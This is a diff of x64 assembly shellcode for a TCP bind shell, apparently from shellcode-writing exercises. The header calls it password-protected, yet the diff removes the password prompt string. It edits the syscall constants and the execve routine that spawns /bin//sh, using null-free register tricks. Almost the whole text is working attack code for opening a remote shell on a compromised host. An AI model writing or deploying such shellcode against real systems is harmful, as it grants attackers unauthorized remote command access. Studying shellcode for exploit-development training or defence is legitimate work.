@@ -1,19 +1,21 @@
 ; =================================================
-;   TCP Bind Shell
+;   x64 Password-protected TCP Bind Shell
+;   Author: Alan Vivona
 ; =================================================
 
 global _start
 
     ; Syscall numbers
-    syscalls.socket equ 0x29
-    syscalls.bind   equ 0x31
-    syscalls.listen equ 0x32
-    syscalls.accept equ 0x2b
-    syscalls.close  equ 0x03
-    syscalls.dup2   equ 0x21
-    syscalls.write  equ 0x01
-    syscalls.read   equ 0x00
-    syscalls.execve equ 0x3b
+    syscalls.socket  equ 0x29
+    syscalls.bind    equ 0x31
+    syscalls.listen  equ 0x32
+    syscalls.connect equ 0x2a
+    syscalls.accept  equ 0x2b
+    syscalls.close   equ 0x03
+    syscalls.dup2    equ 0x21
+    syscalls.write   equ 0x01
+    syscalls.read    equ 0x00
+    syscalls.execve  equ 0x3b
 
     ; Constant definitions
     ipv4    equ 0x02            ; AF_INET
@@ -30,10 +32,6 @@ global _start
     ;:> echo -n '//bin/sh' | rev | xxd
     ;:  00000000: 6873 2f6e 6962 2f2f hs/nib//
     binshString     equ 0x68732f6e69622f2f
-
-    ;:> echo -n '>>pass?:' | rev | xxd
-    ;: 00000000: 3a3f 7373 6170 3e3e :?ssap>>
-    passPromptString    equ 0x3a3f737361703e3e
 
     ; Configs
     config.max_cons equ 0x2
@@ -136,14 +134,13 @@ _start:
     jns loop_through_stdfds
 
     ; 9 - Execve
-    mov rdx, r14
-
-    push r14 ; First NULL push    
+    xor rdx, rdx
+    push rdx ; First NULL push    
     mov rbx, binshString ; push /bin//sh in reverse
     push rbx     ; store /bin//sh address in RDI
     mov rdi, rsp 
     
-    push r14 ; Second NULL push
+    push  rdx; Second NULL push
     mov rdx, rsp
     push rdi     ; set RSI to address of /bin//sh
     mov rsi, rsp
